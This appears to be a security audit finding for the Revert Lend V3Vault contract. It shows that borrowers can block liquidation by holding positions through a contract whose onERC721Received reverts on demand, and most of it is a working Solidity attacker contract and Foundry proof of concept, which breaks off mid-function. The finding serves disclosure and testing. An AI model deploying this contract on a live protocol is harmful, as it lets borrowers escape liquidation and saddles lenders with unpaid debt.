# Vulnerability details

# `V3Vault::liquidate` users can avoid liquidation by rejecting ERC721 transfers

## Impact
When a user calls `V3Vault::liquidate` to liquidate a position, the vault will attempt to transfer the position's NFT to the owner using `safeTransferFrom`.

Notice `_cleanupLoan` call inside `V3Vault::liquidate` function:

https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L744

```solidity
        _cleanupLoan(params.tokenId, state.newDebtExchangeRateX96, state.newLendExchangeRateX96, owner);
```

https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L1077-L1085

```solidity

    function _cleanupLoan(uint256 tokenId, uint256 debtExchangeRateX96, uint256 lendExchangeRateX96, address owner)
        internal
    {
        _removeTokenFromOwner(owner, tokenId);
        _updateAndCheckCollateral(tokenId, debtExchangeRateX96, lendExchangeRateX96, loans[tokenId].debtShares, 0);
        delete loans[tokenId];
@>        nonfungiblePositionManager.safeTransferFrom(address(this), owner, tokenId);
        emit Remove(tokenId, owner);
    }

```

`nonfungiblePositionManager` contract calls `onERC721Received` on the recipient after `safeTransferFrom`. 

A malicious user can avoid liquidation by creating a collateralized position calling `V3Vault::create`, passing a smart contract address as the `recipient` parameter and having the smart contract revert `onERC721Received`. The malicious user can set the contract to reject or accept the NFT transfer to his convenience.

As a consequence, undercollateralized positions cannot be liquidated, leading to protocol debts that can't be reduced.

## Proof of Concept

Actors:

- `TEST_NFT_ACCOUNT`: The attacker, he uses a smart contract (`attackerContract`) that reverts `onERC721Received`. The attacker controls when to receive or reject the NFT transfer.

The attacker will execute the following steps:

Step 1: Create a contract with a malicious `onERC721Received` implementation, then transfer the NFT to the attacker contract before starting to reject incoming ERC721 tokens.
Step 2: Create a new collateralized position passing the attacker contract as the recipient.
Step 3: Reject incoming ERC721 tokens.

- `WHALE_ACCOUNT`: The liquidator, he will attempt to liquidate the position.


Attacker Contract (imports and pragma omitted for brevity, full code in the steps to reproduce the tests):

```solidity

// +------------------------------------------------------------------------------------------------------+
// |             Step 1: Create a contract with a malicious `onERC721Received` implementation             |
// +------------------------------------------------------------------------------------------------------+

contract AttackerContract is IERC721Receiver {
    INonfungiblePositionManager public immutable nonfungiblePositionManager;
    IVault public immutable vault;
    bool public isReceiving = true;
    address public owner;

    constructor(address _nonfungiblePositionManager, address _vault) {
        nonfungiblePositionManager = INonfungiblePositionManager(_nonfungiblePositionManager);
        vault = IVault(_vault);
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    // Allows the attacker to control whether the contract will receive the token or not
    function setReceiving(bool _isReceiving) external onlyOwner {
        isReceiving = _isReceiving;
    }

    // Malicious `onERC721Received` implementation. It will revert if `isReceiving` is false
    function onERC721Received(address, address, uint256, bytes calldata) external view override returns (bytes4) {
        require(isReceiving, "Won't receive the token");
        return this.onERC721Received.selector;
    }

    function approve(address _spender, uint256 _tokenId) external onlyOwner {
        nonfungiblePositionManager.approve(_spender, _tokenId);
    }

    function create(uint256 _tokenId, address _recipient) external onlyOwner {
        vault.create(_tokenId, _recipient);
    }

    function borrow(uint256 _tokenId, uint256 _assets) external onlyOwner {
        vault.borrow(_tokenId, _assets);
    }
}
```

POC:

```solidity
    // +--------------------------------------------------------------------------------------------------+
    // |             Step 2: Create a new collateralized position using the attacker contract             |
    // +--------------------------------------------------------------------------------------------------+

    function _setupBasicLoanWithMaliciousContract(bool borrowMax) internal {
        // lend 10 USDC
        _deposit(10000000, WHALE_ACCOUNT);

        // The TEST_NFT_ACCOUNT intends to create a new collateralized position and avoid liquidation
        // For this purpose, TEST_NFT_ACCOUNT transfers the NFT to the attacker contract
        vm.startPrank(TEST_NFT_ACCOUNT);
        attackerContract = new AttackerContract(address(NPM), address(vault));
        NPM.safeTransferFrom(TEST_NFT_ACCOUNT, address(attackerContract), TEST_NFT);
        vm.stopPrank();
        assertEq(NPM.ownerOf(TEST_NFT), address(attackerContract)); // NFT is now owned by the attacker contract

        // add collateral
        vm.prank(TEST_NFT_ACCOUNT);
        attackerContract.approve(address(vault), TEST_NFT);
        vm.prank(TEST_NFT_ACCOUNT);
        attackerContract.create(TEST_NFT, address(attackerContract)); // The attacker contract creates a new collateralized position
        assertEq(vault.ownerOf(TEST_NFT), address(attackerContract)); // The attacker contract is now the owner of the collateralized position

        (, uint256 fullValue, uint256 collateralValue,,) = vault.loanInfo(TEST_NFT);
        assertEq(collateralValue, 8847206);
        assertEq(fullValue, 9830229);

        if (borrowMax) {
            // borrow max
            vm.prank(TEST_NFT_ACCOUNT);
            attackerContract.borrow(TEST_NFT, collateralValue);
        }

        // +---------------------------------------------------------------+
        // |             Step 3: Reject incoming ERC721 tokens             |
        // +---------------------------------------------------------------+
        // The attacker contract sets the receiving flag to false
        // This will prevent the attacker contract from receiving any ERC721 tokens when `safeTransferFrom` is called in `V3Vault::_cleanupLoan`
        vm.prank(TEST_NFT_ACCOUNT);
        attackerContract.setReceiving(false);
    }

    function _testMaliciousContractLiquidation(LiquidationType lType) internal {
        // malicious user (TEST_NFT_ACCOUNT) has created a collateralized position using his attacker contract, and it will reject ERC721 token transfers
        _setupBasicLoanWithMaliciousContract(true);

        // +--------------------------------------------------------+
        // |             Set conditions for liquidation             |
        // +--------------------------------------------------------+

        (, uint256 fullValue, uint256 collateralValue,,) = vault.loanInfo(TEST_NFT);
        assertEq(collateralValue, 8847206);
        assertEq(fullValue, 9830229);

        // debt is equal collateral value
        (uint256 debt,,, uint256 liquidationCost, uint256 liquidationValue) = vault.loanInfo(TEST_NFT);
        assertEq(debt, collateralValue);
        assertEq(liquidationCost, 0);
        assertEq(liquidationValue, 0);

        if (lType == LiquidationType.TimeBased) {
            // wait 7 day - interest growing
            vm.warp(block.timestamp + 7 days);
        } else if (lType == LiquidationType.ValueBased) {
            // collateral DAI value change -100%
            vm.mockCall(
                CHAINLINK_DAI_USD,
                abi.encodeWithSelector(AggregatorV3Interface.latestRoundData.selector),
                abi.encode(uint80(0), int256(0), block.timestamp, block.timestamp, uint80(0))
            );
        } else {
            vault.setTokenConfig(address(DAI), uint32(Q32 * 2 / 10), type(uint32).max); // 20% collateral factor
        }

        if (lType == LiquidationType.ValueBased) {
            // should revert because oracle and pool price are different
            vm.expectRevert(IErrors.PriceDifferenceExceeded.selector);
            (debt, fullValue, collateralValue, liquidationCost, liquidationValue) = vault.loanInfo(TEST_NFT);

            // ignore difference - now it will work
            oracle.setMaxPoolPriceDifference(10001);
        }

        // debt is greater than collateral value
        (,,, liquidationCost,) = vault.loanInfo(TEST_NFT);

        vm.prank(WHALE_ACCOUNT);
        USDC.approve(address(vault), liquidationCost - 1);

        (uint256 debtShares) = vault.loans(TEST_NFT);

        vm.prank(WHALE_ACCOUNT);
        USDC.approve(address(vault), liquidationCost);

        // +--------------------------------------------+
        // |             Attemp liquidation             |
        // +--------------------------------------------+

        // WHALE_ACCOUNT calls `V3Vault::liquidate`, but the attacker contract will reject the ERC721 transfer
        vm.prank(WHALE_ACCOUNT);
        vm.expectRevert("Won't receive the token");
        vault.liquidate(IVault.LiquidateParams(TEST_NFT, debtShares, 0, 0, WHALE_ACCOUNT, "")); // liquidation fails

        //  NFT was NOT returned to owner.
        assertEq(NPM.ownerOf(TEST_NFT), address(vault));

        // debt NOT payed
        console.log("Attacker contract `isReceiving` value: %s", attackerContract.isReceiving());
        console.log("Vault total of debt shares after calling `liquidate`: %s", vault.debtSharesTotal());

        // All the conditions for the liquidation to be successful were met, but the attacker contract caused the liquidation to revert by rejecting the ERC721 token transfer.
        // To demonstrate that the liquidation would have been successful if the attacker contract didn't reject the ERC721 token transfer,
        // let's have the attacker set his contract `isReceiving` variable to `true` and try to call `liquidate` again.

        vm.prank(TEST_NFT_ACCOUNT);
        attackerContract.setReceiving(true); // now the attacker contract will receive the ERC721 token

        vm.prank(WHALE_ACCOUNT);
        vault.liquidate(IVault.LiquidateParams(TEST_NFT, debtShares, 0, 0, WHALE_ACCOUNT, "")); // liquidation successful

        //  NFT was returned to owner
        assertEq(NPM.ownerOf(TEST_NFT), address(attackerContract));

        // all debt is payed
        assertEq(vault.debtSharesTotal(), 0);
        console.log("Attacker contract `isReceiving` value: %s", attackerContract.isReceiving());
        console.log("Vault total of debt shares after calling `liquidate`: %s", vault.debtSharesTotal());
    }

    function testMaliciousContractLiquidationTimeBased() external {
        _testMaliciousContractLiquidation(LiquidationType.TimeBased);
    }

    function testMaliciousContractLiquidationValueBased() external {
